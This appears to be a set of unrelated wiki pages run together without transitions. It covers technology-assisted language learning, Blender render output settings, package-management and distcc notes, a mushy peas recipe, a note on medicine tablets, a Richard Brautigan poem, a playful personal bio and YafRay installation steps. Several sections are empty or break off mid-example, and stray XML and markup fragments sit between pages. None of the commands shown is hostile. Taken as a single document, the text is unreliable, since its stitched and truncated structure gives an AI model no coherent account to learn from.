Information is provided below on DVD movies that include subtitles, closed captions and/or audio description in the movie's original language.

== Games ==

Games can also be a source of meaningful input for students and can be used to supplement content-based lessons.

Note that games not specifically meant to be &quot;educational&quot; can also be very useful. Varieties of game that involve a lot of language that must be understood to solve puzzles, or with a compelling storyline told with language are the best. If solving a puzzle rests on understanding the language used by the game, there is more motivation to figure out the meaning than if the language is not necessary to playing the game.

There are various practicalities to playing games in other languages. Computer and handheld games don't tend to be region-locked so the only problem in that case is importing the games. If the target language is spoken somewhere within the region (as defined by games companies) then for console gaming it's just a matter of importing the material. If the target language is only spoken outside of your region, consoles will (usually) either have to be imported or modified to play foreign games.

== Conclusion ==

As described above, the wide variability of interesting and high-quality FL text and audio now available via the Internet provides an extremely valuable resource for FL learners.  A computer anywhere in the world connected to the Internet allows access to these materials in dozens of not hundreds of languages.  As detailed above, the resources for learners of Spanish, French and German (not to mention English for ESL learners) are particularly abundant, including daily newspapers, current magazines and interesting radio programs.

But these resources will have little impact on one’s developing language proficiency unless they are accessed frequently.  For autonomous language learning, this can probably best be accomplished by incorporating FL reading and listening into one’s daily activities by using them as regular sources of news, education, and entertainment.  Two of the most convenient techniques described above for accomplishing this is to use a PDA to automatically download FL news and a low-power FM or AM transmitter to make FL radio readily accessible anywhere in one’s home or on one’s campus.

Such timely and interesting text and audio can also be incorporated into FL courses by assigning listening and readings activities to be done outside of class and discussed in class.  Sources of FL text and recorded (on-demand) audio could be delivered via Web-based learning management systems such as Blackboard (www.blackboard.com) or WebCT (www.webct.com) and incorporated into assignments and assessments activities.  Other activities could include having students find their own favorite sources of FL text and audio on the Internet and sharing these with their classmates (possibly via the creation of websites with descriptions of and links to the sources).

Another possible incentive for autonomous student use of FL text and audio on the Internet is obtaining academic credit for FL proficiency acquired outside of formal classes.  In the United States, approximately 1,800 colleges and universities are members of the American Council on Education (ACE) which has established [http://www.languagetesting.com/actfl_article.htm guidelines] for awarding academic credit for FL proficiency as assessed by the Oral Proficiency Interview (OPI) of the American Council of Teachers of Foreign Languages ([http://www.actfl.org ACTFL]).  This test can be taken for a fee via telephone in 37 languages.

A final recommendation for the use of these Internet resources for FL learning is to show students the resources that are available for language learning on the Internet and ways to use these resources.  These resources include not only the input resources for reading and listening considered in this paper but also resources for finding language learning partners (Tandem learning partners) on the Internet and using computer-mediated communication (CMC) to interact with them so that both partners can improve their FL proficiency in reading, writing, listening and/or speaking (see Cziko and Park, 2003; Cziko, 2004).  Allowing FL students to develop an appreciation for the resources available on the Internet and providing ideas for their use such as those provided in this paper suggest a new version of the ancient Chinese proverb that would go something like this:  “Provide a foreign language student with a language lesson and the student will learn for an hour.  Show a foreign language student how to make use of the Internet for language learning, and the student will learn for a lifetime.”

==Interaction: Introduction==
The 21st century has often been coined as the “Age of Communication” with the rapid development of cell phones, the internet, e-mail, satellite communications, instant messenger programs, and new technologies such as voice over IP.  These progressions have made communication across incredible distances exceptionally affordable and available.  '''In the field of autonomous technology assisted language learning (ATALL), one should remember that “autonomous” means “self-sufficient”, not “solo”.'''  This new framework of communication supports individualized and independent learning within a network of peers around the world that provides interactions through extensive use of online learning and other technologies(Ng &amp; Nicholas 2007).

Instead of being limited to basic input and output exercises, the learner can link up with a native speaker of the target language and engage in real time or asynchronous conversations.  This can be done through text, audio, and video in a variety of formats.  Numerous websites and programs also provide simple networking tools with user profiles so that one can find the ideal match for his/her interaction.  Massively-multiplayer environments such as Second Life also provide a virtual world for interaction that is alive twenty-four hours a day.  The format and setup of the interaction can therefore be easily customized to the learner’s schedule and preferences.

Interestingly, interaction via online methods has also shown certain advantages over face to face conversation.  Beyond the simplicity of sitting down at two separate computers instead of physically bringing two people to the same location, it also provides a more comfortable environment that can make learners more willing to communicate (Freiermuth &amp; Jarrell 2006).  Similar to how some people prefer writing a letter instead of dealing with a face to face confrontation, online communication by e-mail or even in a chatroom can remove the stress of being physically in front of a person.  The learner no longer has to worry about his/her physical appearance or “filling in the silence”, and can better focus on the language and communication.

Through the use of technology, the lone autonomous language learner can now tap into a plethora of methods for authentic interactions.  It lets him/her use and practice the target language the way it was originally created: for free communication and expression of ideas between two different beings.

== Introduction ==

While extensive L2 input, output and interaction may be necessary for developing L2 proficiency, for some (most?) learners input and interaction may not be sufficient to attain high levels of L2 proficiency and grammatical accuracy.  There are often certain aspects of a L2 that are difficult to acquire without devoting special attention and practice to them.

'''Drills''' involve focused repetition of certain tasks designed to aid the acquisition of vocabulary or certain grammatical structures. WordChamp is an example of a program that allows learners to create their own vocabulary list and review them using a variety of drills using reading and audio.


'''Input enhancement''' refers to a group of techniques for focusing a learner's attention on aspects of the language that may otherwise go unnoticed and unlearned (see Wong, 2005). Enhanced input includes '''input flood''', '''textual enhancement''', and '''structured input''' activities.

'''Task-based language learning activities''' (see Nunan, 1999) may also be a way of helping language learners notice and learn form-function relationships in a second language. (perhaps this should be in the Interaction section of this Wikibook?)

'''Language reconstruction''' tasks may provide another way for L2 students to improve their L2 proficiency.  Such tasks can involve either reading/writing or listening/speaking and involve the learner repeating (via writing or speaking) L2 segments that they have just read or heard.  Tools to allow L2 learners to select their own audio or written text for such practice can be provided in a Web-based environment.

Finally, there are '''web- and computer-based language courses''' (see Courseware below) in a wide variety of formats, from total, structured immersion in the second language (e.g., Rosetta Stone) to approaches which rely heavily on the memorization of L1-L2 correspondences (e.g., the Pimsleur Method). Between these two extremes is a less commonly used method that gradually moves from L1 to L2 by gradually adding L2 words and phrases and removing L1 ones. An example of this can be found in Power-Glide's [http://www.power-glide.com/power_glide_demos_1.asp &quot;Diglot Weave&quot;] (also called &quot;sandwich stories in China).

For autonomous learners, factors such as cost (free or cheap being best), accessibility (web-based being best) and the ability for a learner to keep track of his or progress may be particularly important.

== Structured Input == 
Structured input (SI) activities, as developed by Van Patten and his associates, is a type of processing instruction (PI) developed to &quot;force&quot; L2 learners to pay attention to certain aspects of the L2, particularly those that are redundant and not salient, such as indefinite and definite articles for a Chinese learner of English and the subjunctive for American learners of French and Spanish. Structured output activities may also be useful to help L2 learners acquire difficult aspects of the L2. Providing such exercises on the Web would allow L2 learner worldwide to work on and acquire the &quot;stubborn&quot; aspects of their L2.

*Running dictation (extracted from IACC Newsletter, 18 November 2005, Issue 2 (newsletter@iacc.com.tw)

&quot;Here's one of my favourite games called Running Dictation. It works extremely well and by doing this activity, the students get to practice all the skills.

Aims
To develop clearer pronunciation. To wake up a sleepy class!

You need
Choose a short piece of text (e.g. five lines) and make enough copies of the text for one   per pair of students.

Procedure      

Stick the texts up around the room, away from where the students are sitting.
Put students into pairs and allocate them a text on the wall. Give each pair a text that is far away from them.
Now ask one person in each pair to sit where they are with a pen/pencil and paper. Their partner has to stand up and 'run' to their text, read it, probably chunk by chunk, memorise it, run back to their partner and dictate it, helping in any way they can. However they cannot actually write it (e.g. 'No, &quot;actually&quot; has got 2 &quot;l&quot;s.' 'There's a new line there.' etc.).
The winners are the pair with the first absolutely correct version of the text.

Extension/variation
The activity can then be redone, with a different text and with the other member of the pair acting as 'runner'. NB This activity can be very noisy so you may need to check with neighbouring classes that it will not disturb them too much.

Have Fun!!&quot;

Another individual variation of this type of task it to provide a text on one side of a sheet of paper and the student has to copy it with no errors on the other side.  This will force the student to memorize chunks of the text because the student will not be able to see the text while writing.

===== Conclusion =====

Dictation (copy spoken language) and lectation (copy written language) exercises are easily provided via computer (e.g., as Moodle quiz) because the output to score is written.

These techniques can also be used as tools for [[Autonomous Technology-Assisted Language Learning/Assessment | assessment]].

==== Technology for Language Reconstruction ====

Available from [http://www.multilingualbooks.com Multilingual Books], the [http://www.multilingualbooks.com/instant-replay.html '''Instant Replay Digital Cassette Recorder'''] ($49), (also called &quot;Language Repeater&quot;) is a combination audio cassette player/recorder and digital player/recorder that allows you to easily an automatically repeat phrases from an audio cassette tape.  This allows a language learner opportunities for repeated listening.  There is also a mode that automatically pauses after playing a phrase (as defined by breath pauses) and then switches automatically to record mode.  After the user has finished recording the phrase, it will playback the learner's recording and then compare it to the cassette tape.  It will repeat the same phrase over and over, providing multiple opportunities for listening and repeating until the user does not say anything, at which time it will play the next phrase.

I [GC] believe that this playback and recording modes of this machine can be used for effective language-learning exercises.  As the audio cassette is somewhat dated technology, it would be great if the same functions (and additional ones, such as variable speed playback) were made available on a portable music player for playing audio files and on computer software for playing audio and video files, CDs and DVDs.

This machine can also be a very useful tool for transcribing audio tapes.  In the playback and compare mode, the user can just say &quot;again&quot; or &quot;hey&quot; (anything) and the machine will repeat the phrase again.  If the user is silent, it will play the next phrase.

(Please note that the Instant Replay Digital CD/MP3 Recorder mentioned on the same webpage is no longer available, but the vendor is attempting to make a similar model available soon).

== Text Exerciser ==

Adapted from discussion between Gary Cziko and Errol O'Neill 2005.04.04

Errol discovered an interesting French exercise at http://fog.ccsf.cc.ca.us/~creitan/clark.htm that contrasts the imperfect and past perfect tenses in French.

What is nice is about this exercise is that (a) it takes place within a meaningful paragraph, (b) provides opportunities for needed input relevant to aspects of grammar to be acquired, and (d) &quot;forces&quot; the learner to pay attention to form, and (d) provides feedback for each right or wrong answer.

I am wondering if this type of exercise couldn't be adapted so that it provides input flood (i.e., many examples of a targeted structure), enhanced text and structured input all in one exercise (see Wong, 2005).

This could be accomplished with different views of the same paragraph as follows:

1. Normal view with correct tenses included.  To the extent that there are many examples of a target structure, this would be '''input flood'''.

2. Clicking on a button would turn all the targeted tenses into a larger font with a distinctive color (e.g., Big and Green).  This would be '''enhanced input'''.

3. A different button would put the paragraph into the form of the original exercise, requiring the student to choose the correct verb form (Errol wants to make it even harder by providing only the infinitive and requiring the student to type the correct form rather than just recognize it).  This would be '''structured input'''.  Then as each correct form is chosen (or typed), it would turn back into normal text, that is back to no. 1, '''input flood''' again.

Students could repeat the cycle as many times as they wanted.  All this could be easily set up by someone with basic computer programming and web design skills.



--------------------------------------------------------------------------------


Now, wouldn't it be really neat if the preparation of these different views could be done automatically?  That is, find an interesting text and have a program provide the three views above.  For example, you find an authentic interesting text that has lots of articles, pronouns, and past tense varieties.  You paste this text into a window and then tell the program that you want to focus on articles.  Of course, nothing has to be done for view 1 ('''input flood''').  But then the learner tells the program that he or she wants to emphasize (enhance) the articles.  The program then finds all the articles, enhances them by making them big and green, et voilà, you have '''enhanced text'''.  Then the student presses another button and the program creates the '''structured input''' exercise by taking each article and adding the other two articles as choices (e.g., if the correct choice is &quot;the&quot;, it adds &quot;a&quot; and [blank] (no article) as choices.  This is the structured input view which requires that the student choose the correct article.  As each correct article is chosen, the other choices disappear and it turns back into normal text and the cycle can be repeated, either with the same grammatical focus, of with and different one (e.g., past tense forms or pronouns).

This should also be pretty easy to set up for something as simple as articles (a, the, null) and pronouns (he, she , it , they) in English.  Tenses are a bit tougher perhaps as the program would have to know how to generate other tenses to create the distractors, e.g., if it sees &quot;bought&quot; it would have to generate something like &quot;was buying&quot;, &quot;have bought&quot;, &quot;had bought&quot;, etc.

An even more sophisticated program would first analyze the text and see what forms were most common and suggest what types of grammatical forms the student could use the text to focus on (it would not suggest focusing on pronouns if there were few pronouns).

I think this could be a very useful programming, combining the best of current input techniques that focus on form while allowing the learner to choose the text that he or she is interested in.

As it would create useful exercises from normal text, we could call it the &quot;Text Exerciser&quot; and would be a great ATALL tool.

== Grammar Consciousness-Raising (GCR) ==

See Fotos and Ellis in Wong (2005) input enhancement book (2005)

* Grammar consciousness raising (GCR) 
** Target structure: ''many'' vs. ''much'' vs. ''a lot of'' vs. ''lots of''
*** Correct: He has many brothers. 
*** Incorrect: *He has many money. 

*** Correct: He has much money
*** Incorrect: *He has much sisters. 

*** Correct: He has a lot of good ideas. 
*** Correct: He has a lot of confidence.
*** Correct: He has lots of good ideas.
*** Correct: He has lots of confidence.

** Complete the following sentences and describe the rules that underlie the use of many, much and a lot of. 
*** When you are describing something you can count (like apples) , you use ________, ________ or ________. 
*** When you are describing something you cannot count (like apple sauce), you use ________, ________ or ________.
*** You can use __________ or ___________ with both things you can count (like apples) and things you cannot count (like apple sauce).

Note 1: You cannot use the trick of always using ''a lot of'' or ''lots of'' for asking questions.  You must instead use ''how'' + ''many'' for count nouns and ''how'' + ''much'' for mass (uncountable) nouns.

Note 2: Many languages, such as French, German and Spanish, use the same word (''beaucoup'', ''viel'', ''mucho'') to describe &quot;lots of&quot; for both countable and mass nouns.  So the use of ''much'' vs. ''many'' in English is likely to cause difficulty for natives speakers of these languages learning English as an additional language.

== Introduction ==

Learners engaged in ATALL may wish to periodically assess their reading, writing, listening and/or speaking ability in their L2.  Such assessment can provide useful feedback on progress made and allow learners to target remaining areas of L2 weakness.  In addition, learners may be able to obtain academic credit for L2 proficiency attained autonomously.
*[introduction of language testing http://docs.google.com/Doc?id=d7m9bmf_14gc38bg] provides basic information of language testing.

==Vocabulary==
===Mulitingual===
*[http://www.wordchamp.com WordChamp] (see [http://calico.org/CALICO_Review/review/wordchamp00.htm review]) a Web-based program that provides vocabulary exercises with assessment and record keeping in English, French, Spanish, German and Japanese as well as for user-created lists. The drills involve a flashcard based drill available to all users without charge as well as Text Translation, Listening Comprehension, Dictation, Translating Aloud, Reading Practice and Pronunciation drills (all based on single words) for premium (paying) users. Image Identification and open-ended L2-&gt;L2 tests are also available. Teachers can have custom content created based on their course materials, including audio for words and phrases. 

*[http://www.lextutor.ca The Compeat Lexical Tutor] includes many [http://www.lextutor.ca/tests/ tests] of vocabulary in English and French. These tests can give learners of English and French a good idea of their vocabulary knowledge by providing graded tests from the most frequent 1000 words of the language to less common academic words and words that appear at the 2000 to 10,000-word levels. The Compleat Lexical Tutor can also create [http://www.lextutor.ca/cloze/ cloze tests] in which selected words or every nth word is deleted from a text and the testee has to guess the missing word based on context and knowledge of the language.

==Pronunciation and Spoken Language==
Pronunciation scoring and diagnosis, often using speech recognition and related technologies, is a new means of assessment missing from traditional forms of language assessment such as the TOEFL examination.

===English===
*[http://harcourtassessment.com/haiweb/Cultures/en-US/Harcourt/Community/PostSecondary/Products/Versant/VersantHome.htm Versant] tests &quot;are the only completely automated tests of spoken languages. Using patented speech processing technology from Ordinate, Versant tests are delivered over a telephone or on a PC and scored by computer. Once administered, numeric scores and performance levels that describe the test-taker's ability to understand and speak the selected language are generated within minutes and can be viewed online. Scores are comprised of an overall score and diagnostic sub-scores.&quot; (from website)

===Low stakes===
*[http://www.auralog.com/ '''Auralog'''] and [http://www.readsay.com/llsrpc.html many other companies] offer pronunciation assessment on CD-ROM and similar media for personal computers.

*[http://www.carnegiespeech.com/ '''Carnegie Speech Corporation'''] offers '''[http://www.carnegiespeech.com/native_accent_speech.html NativeAccent]''' for English language pronunciation fluency improvement based on Carnegie Mellon University's Sphinx-2 open source speech recognition system.

*[http://www.readsay.com/ '''ReadSay Literacy'''] offers low-stakes pronunciation assessment using speech recognition technology on [http://www.readsay.com/PROnounce/ handheld computers and mobile phones], based on Sensory FluentSoft originally from Oregon Health and Science University's [http://cslu.cse.ogi.edu/toolkit/ CSLU Toolkit] and [http://www.readsay.com/pdemo/ as web client-server technology], which is also based on CMU's open source Sphinx-2.

===High stakes===
*[http://www.ordinate.com/ '''Ordinate Harcourt'''] offers high-stakes pronunciation assessment using telephone and web technology. This system is used to screen for hiring and academic admissions.

== Language Reconstruction Tasks ==

==== Verbatim Reconstruction ====

===== Audio to Audio: Elicited Imitation =====

===== Audio to Written: Dictation =====

An autonomous learner may find it useful to transcribe portions of movies with [[Wikipedia:Closed captions | closed captions]],[[Wikipedia:Subtitles | subtitles]], or [[Wikipedia:List_of_DVDs_with_audio_description | audio descriptions]], then compare the written transcription with the &quot;official&quot; version on the screen. However, the learner should be aware that captions don't always match the spoken version exactly. They're often produced from a version of the script that's out of synchronization with the actual production. See [[Autonomous Technology-Assisted Language Learning/Input#DVD_Movies | the DVD section]] for more information.

==Output Format Basics==
[[Image: Format tab.png]]


When you render a scene in Blender, by default a small window will open showing your image. If you want to publish your picture, you may want to render it a bit bigger. To do this, you have to open the Scene context ('''F10''') and locate the Format tab (usually on the right).

You will see some settings there. Let's go through their meanings:
* [[Image:Format_settings_sizeX.png]]SizeX: This parameter sets the width of the image in pixels.
* [[Image:Format_settings_sizey.png]]SizeY: This parameter sets the height of the image in pixels.
* [[Image:Format_settings_aspXaspY.png]]AspX, AspY: These parameters specify the aspect ratio of the pixels. By default, this is 100:100, because a pixel on a computer screen has equal width and height. These settings can be used for screens whose pixels don't have equal width and height. For example, on a PAL system one pixel's width/height ratio is 54:51, which you can select there easily. Notice that these parameters don't change the size of the image.
Don't forget, setting the number of pixels changes the resolution.  Resolutions for your computer desktop are normally 1024x768, but can be larger.  This means that it is 1,024 pixels wide and 768 pixels tall.  To make an image this size in Blender, change the SizeX to 1024 and the SizeY to 768.

If this does not come out correctly, then you should right-click your desktop and click Properties, then go to Appearance. The highlighted numbers are X by Y.

==Output formats==
Blender has the ability to save in a wide variety of formats.  To change the format, click the drop-down box ( [[Image:Format_settings_drop-down_box.png]] ) halfway down the format tab.  Currently, Blender can save files in the following formats:
* TIFF
* OpenEXR
* DPX
* Cineon
* Radiance HDR
* Iris:
* Iris + Zbuffer:
* HamX: extremely compact but only for the &quot;Play&quot; option
* Jpeg: default format. Lossy compression.
* BMP:  uncompressed.
* PNG: open, lossless compression, alpha channel.
* Targa Raw: uncompressed Targa.
* Targa: Compressed Targa.

'''Single rendered images are not automatically saved to disk.  Once Blender finishes rendering a scene (this can take some time), press F3 and the save dialogue will be opened where you can specify a filename and location for the output.  You can retrieve the last picture rendered by pressing ''F11''.'''

When working with moving images, you need to remember that you are often looking at file size (such as on the net) and compatibility with media players. Videos consists out of 2 elements: the file format and the codec. An example of this would be that you have a MOV file (the file format) with a H.264 codec. In other words, the codec is the way that the files are interpreted (compressed-decompressed = codec) by the media player. Youtube currently uses the FLV format with an H.264 codec. The VLC player should play almost any format available.

Video:
* AVI Codec: saves an AVI with a compression codec. Once selected a pop-up menu will appear giving options as to what codec you want.
* AVI Jpeg: saves an AVI as Jpeg images. Compressed but lossy.
* AVI Raw: saves an AVI with uncompressed frames.
* QuickTime: saves a QuickTime MOV file. Once selected, a pop-up menu will appear giving various video codecs to choose from. Can also remain uncompressed.
* FFMpeg: Implemented in a Google Summer of Code event, this codec is composed of multiple software libraries, so you can choose which codec to use under the video tab. The audio tab lets you choose from several different audio codecs to use and also has a bitrate setting. The Multiplex Audio button will render your animation with sound (if you have any), a nice feature. 

For more information, see 
*[[Blender 3D: Noob to Pro/Creating animated GIFs using Blender and Gimp]]
*[[Blender 3D: Noob to Pro/Creating Ogg-Theora movies using Blender]]

==Cropping==
You can see [[Image:Format_settings_crop_button.png]] button next to drop-down box. If you activate it, image automatically gets cropped after rendering.

== Palette ==
[[Image:Format_settings_palette_selection.png]]

You can select three different palettes in Blender:
* '''BW''' - images are saved with BW (greyscale) data
* '''RGB''' - images are saved with RGB (color) data
* '''RGBA''' - images are saved with RGB and Alpha data (if supported)

==Pre-sets Just For You==
[[Image:Format_settings_pre-sets.png]]

The render settings in blender are customizable for unique results, 
but blender includes 9 pre-sets for common render outputs. One can use
the pre-set as is or can use it as a starting point at which the settings 
are then modified.

'''[[w:PAL|PAL]]''' and '''[[w:NTSC|NTSC]]''' are systems used in analogue Television. 
If someone were making an animation for TV or DVD, that individual may use one of these depending on which is used in their country. Both the PAL and NTSC pre-sets in Blender
only affect the dimensions and pixel aspect ratio of the render and doesn't turn on anti-aliasing [[Blender_3D:_Noob_to_Pro/OSA|(OSA)]]
or affect any other variable in the render. '''Pal 16:9''' is a newer an improved version of PAL which is 
also known as [[w:PALplus|PALplus]].
 

The Default pre-set uses the dimensions and an pixel aspect ratio as PAL but also includes [[Blender_3D:_Noob_to_Pro/OSA|OSA]] and shadows.

The '''Preview''' pre-set generates a low quality setting for a fast render that usually is not used as a final output. 

* '''PANO''' is short for Panorama. This setting allows for a full 360 degree panoramic render. 
* '''FULL''' produces a render that fits your monitors full screen.
* '''HD''' is for High Definition.

The horn has a very wide variety of music written specifically for it. Its relatively great range and dynamic contrast has allowed composers to write music of many styles for it.

The Horn WikiBook, due to copyright law, cannot include actual music for each and every piece of music listed.

= Package Management System Overview =
This section is about the different PMS on different OS. By understanding each
PMS we can find out the differences and try to make them work together under a central and
hyper PMS. The main interests of following sections are to understand how to make these PMS work with TWW HPMS.

* package removal by command line.
* package automated dependency install.
* package depot.

====== Macport ======
A few notes when learning macort. Macport use TCL scripting language to automate the package creating,installation and other package management processes. 
* Following are some directories path for Macport build system.

==== RPM  PMS Architecture ====
* The logical layout of an rpm package. An rpm package contains header and payload.
&lt;pre&gt;
     -------------------------------
     | package header  : metadata  |
     ------------------------------
     | package payload : cpio ball |
     -------------------------------
&lt;/pre&gt;
* How to see a package's metadata ?
  '''rpm -qp --xml gnustep-base-debuginfo-1.13.0-1suse93.i386.rpm''' will display the content of package header(metadata). Following is an example.
&lt;pre&gt;

&lt;/pre&gt;

* How to check what kind of file digest is used in a package payload ?

Using Makfile we can acturally create a CPAM system easily. Following is an example 
=== TWW   ===
== non-homogeneous approach == 
=== openpkg  ===
=== Portage  ===
=== OpenSolaris IPS ===

= Package building automation =
= Distributed package building  =

== General Tools for distributed build ==
=== gmake  ===
=== SGE : qmake  ===
=== Distcc  ===
Because distcc can only work with gcc, so it only can compile TWW's package source that utilize gcc compiler.  This means we can use distcc to build pacakges for Redhat Linux.

==== How to use distcc to compile TWW's RH packages source ====
* We will use distcc and newly released lsdistcc to compare the performance gain of compiling RH EL kernel and crosstool on using rhel3-distcc* machines are available in a subnet.

* lsdistcc is a distcc server autodiscovery program. It relies on distcc servers being in DNS with distinctive names ending in numbers 1 through N. It is originally from http://kegel.com/distcc and will probably be included in a future release of distcc. With this helpful small lsditcc program we can dynamically assign the content of DISTCC_HOSTS to use as many available distcc hosts as possible. 

* For each OS platform you want to configure as a distcc execution node, do 
  &lt;pre&gt;
  pkg-inst distcc
  /etc/init.d/TWWdistcc212 start
  &lt;/pre&gt;
* add distcc nodes into your name server;increase the serial number;&quot;ndc reload&quot;. After following aliases are edited in your forward zone file
* also make sure you have a good naming for your distcc execution hosts. ${OS}-distcc%d is the good naming scheme. 
 &lt;pre&gt;

== How to automate this wiki book publishing by automated script ? ==
We need a perl module call &quot;mvs&quot;, it is mediawiki client written in perl language.

* [http://search.cpan.org/~markj/WWW-Mediawiki-Client/bin/mvs MVS]
* Perl mvs support maillist at http://geekhive.net/cgi-bin/mailman/listinfo/www-mediawiki-client-l
* Install mvs from cpan
* A quick check of mvs command.
&lt;pre&gt;
me@myhost&gt; mvs -h
Usage:
      mvs [Options] command [Options] [filename]

      mvs -h|--help
      mvs --version
      mvs -D

      mkdir wikistuff
      cd wikistuff

      mvs [-q|-v] [-d &lt;wikihost&gt;] [-l language_code ] [-u &lt;username&gt;] [-p &lt;password&gt; ] [-w &lt;wiki\
_path&gt;] login

      mvs [-q|-v] update [&lt;file&gt; ..]
      mvs [-q|-v] up [&lt;file&gt; ..]

      mvs [-q|-v] [-M] [-W] -m &quot;commit message&quot; commit [&lt;file&gt; ..]
      mvs [-q|-v] [-M] [-W] -m &quot;commit message&quot; com [&lt;file&gt; ..]

'''Mushy Peas''' is a popular and characteristic British dish that has helped to give British cooking its well-deserved reputation. Mushy peas are often served with [[Cookbook:Fish and Chips|fish and chips]].

==Ingredients==
*Dried [[Cookbook:Marrowfat peas|marrowfat peas]]
*Water to soak and simmer
*2 [[Cookbook:tsp|tsp.]] [[Cookbook:Baking Soda|Baking soda]]
*1 tsp. [[Cookbook:Sugar|Sugar]] (optional, to taste)

==Procedure==
#Place the peas in two or three times their volume of water, along with the baking soda, which speeds the soaking process.
#Leave to soak overnight.
#The next day, drain the peas, and place in a saucepan with enough water to just cover them.
#Add the sugar.
#Bring to the boil and simmer for about 20 minutes, stirring occasionally to help break up the peas.
#Add water or reduce to the desired consistency.
#Season to taste with salt and pepper.

      <text xml:space="preserve">Tablets, sometimes called pills, are commonly used to dispense medicines. Not all pills are the same. Some are time release, gelatine, or medically coated. 

Tablets usually contain the active drug ingredient, plus excipients. 

Excipients are inactive ingredients, such as a dye for the drug to look more appealing, flavor to add taste to the drug (most drugs don't naturally taste very good). 

Time release tablets should NOT be chewed or crushed, since this will produce an overdose of the drug. These tablets are made to be taken only once or twice a day, and are designed so that the drug is slowly released into the body. They are very useful, and decrease the amount of times you need to take medication each day. However, taking a crushed Extended - Released tablet can be very harmful. 

The other tablets, which are not time - release or extended - release,  generally can be chewed, as they are not designed to slowly release the medicine.

Please ask your pharmacist about your specific medication to guide you on how to take it safely.

If I were to live my life 
in catfish forms 
in scaffolds of skin and whiskers 
at the bottom of the pond 
and you were to come by 
    one evening 
when the moon was shining 
down into my dark home 
and stand there at the edge 
    of my affection 
and think, &quot;It's beautiful 
here by this pond. I wish 
    somebody loved me,&quot; 
I'd love you and be your catfish 
friend and drive such lonely 
thoughts from your mind 
and suddenly you would be 
    at peace, 
and ask yourself, &quot;I wonder 
if there are any catfish 
in this pond? It seems like 
a perfect place for them.&quot;
-Richard Brautigan

Hi Everyone, I'm Moly. I'm working on a Ph.D. in math. My Bachelor's was in Creative Writing and Literature. Math is an art form to me. Math is my passion , and I'm following my passion. I believe that mathematics is a divine language, the LOGOS that forms the universe, and I feel that my perspective is under-represented in this culture.

I went to a very old, conservative, traditional single-sex boarding school for high school. I went to college four times before someone was sane enough to give me a degree, during which time I changed my major five times. I intimidate the worst kind of educators, especially bureaucratic ones. I'm largely self-taught, despite my many hours stuck in a classroom. I have studied with geniuses and morons, and have found I've become the Marriage of Genius and Moron as a result.


I have set foot on every continent except Antarctica. I have had the good fortune to meet many of my greatest living heroes. I am a black belt in aikido. I wear a cowboy hat and carry a guitar wherever I go.  I ate breakfast once in a cowboy-boot shop in Nashville with my cousin Pete and we ate ham and eggs and grits while two grizzled old honky-tonkers played Country standards and tourists bought gaudy cowboy boots. I have heard lions roar on the African savannah at sunset and had to drink a stiff drink to keep from trembling. I have sat on Galactic Councils as Earth's representative, and met creatures from fourteen different galactic civilization. I believe that The Basement Tapes , by Bob Dylan and the Band, John Coltrane's Meditations , Thomas Pynchon's Gravity's Rainbow , and Euler's formula:


                                                        eiø  = cos ø + i sin ø


are examples that our species are capable of art.


I know I am a great person if only because the greatest people I've ever met have befriended me throughout my life. I know for a fact that God adores me with an emotion so strong that I would drop dead were I ever to feel that much emotion. I tend to worry about mediocre people and the way they misunderstand me. I blend obviousness with subtlety, and I find it the case that most people latch onto the obvious and give up trying to see the subtlety. I take great pleasure in being obvious, but I also take great pleasure in being subtle.


I still grieve every day over the death of my friends, Bobby Sheehan and Terence McKenna, as well as for the death of Lenny Bruce, of Hank Williams, of Elvis Presley, of Buddy Holly, of Jimi Hendrix, of Jerry Garcia, of Janis Joplin, of Richard Manuel, of Rick Danko, of Frank Zappa, of Oscar Wilde, of Charles Baudelaire, of Alan Turing, of countless millions of my people in the Holocaust. And, like the old blues song says, on a good day I have the blues.


And yet, I see heaven in a little flower, the world in a grain of sand, and eternity in an hour. The stupidest things give me great joy. I love bad sci-fi movies where the monster suits have visible zippers, the villain gives an incoherent, but misanthropic speech, and the director cuts in way too much military stock footage. I love to drink whiskey and sing bluegrass music and pick at my guitar. I would do math even if it were a jailable offense to study math. I walk around stoned on the pleasures life affords me. </text>

'''YafRay''' ('''Y'''et '''A'''nother '''F'''ree '''Ray'''tracer) is an open-source alternative rendering engine supported by Blender. 

'''Reader note: in the new version of Blender (2.46) internal renderer of Blender got a lot of upgrades and is now about two times faster than YafRay, so this article may be considered obsolete.'''

Yafaray 0.1.1 provides 5 different material types independent of Blender. It is also able to show objects behind transparent materials unlike Blender 2.49b.

[[Image:Yafaray0.1.1.jpg]]

'''Further note: the Yafray project has been superseded by [http://yafaray.org Yafaray]. Yafray support was removed from Blender apparently around version 2.44. Use Yafaray instead.'''
As of May, 2011, in MS Windows, it only works with 32-bit Blender 2.49b compiled with Python, with Python 2.6.6 32-bit version installed.

The YafRay render settings are normally hidden.  To show them, switch from the Blender Internal rendering engine to the Yafray rendering engine.

*Go to the Scene Panel (Press F10)
*Click the Render Buttons button
*In the render tab, under the big Render button, click the Blender Internal button and select YafRay.

Now the YafRay and YafRay GI tabs appear.

==Getting Started with Yafray==



First, I would like to state that Yafray renders 2-3 times faster and nicer (includes Global Illumination, Caustics and...) than the normal internal built-in renderer in Blender{{fact}}. So it would just be worth it to download and install it.

On Windows, just download the .zip file and unzip it. You get the .exe file. Run it and follow default instructions. Latest version is 0.1.0 as of October 2008. Now change the Environment variable by adding C:\Program Files\YafRay to your PATH or whichever folder you installed yafray.exe, users Windows 95/98/ME will need to restart where as WinXP users won't. Remember Yafray doesnt have a GUI and is a commmand line tool. Anyway you never need a GUI to run yafray as it runs nicely inside Blender as it is integrated into it. Go to the Command line and type yafray and press return. Now you have two paths

'''''Reader''': Can someone make this a little bit clearer? What is the Command line?''&lt;br&gt;
'''''Answer''': The command line interface (CLI) is an interpreter for the operating system that provides a way of getting around by accepting commands from the keyboard instead of using the mouse to click on icons.  It was the primary method of using the computer in MS-DOS, the predecessor to Windows. There are no buttons like in programs such as Blender. [http://en.wikipedia.org/wiki/Command_line]''

You can access the command line in Windows by pressing Win-R then typing CMD and pressing the enter button. The command line can also be accessed by clicking on the Start menu, going down to &quot;All Programs&quot;, over to the &quot;Accessories&quot; tab, and then clicking on the Command Prompt option. To change the environment variable, enter &quot;path C:\Program Files\YafRay;%PATH%&quot;, without the quotes.

1) If there was an error regarding MSVCR71.dll, then download this file from the Web and place it in the c:\windows\system32 directory.

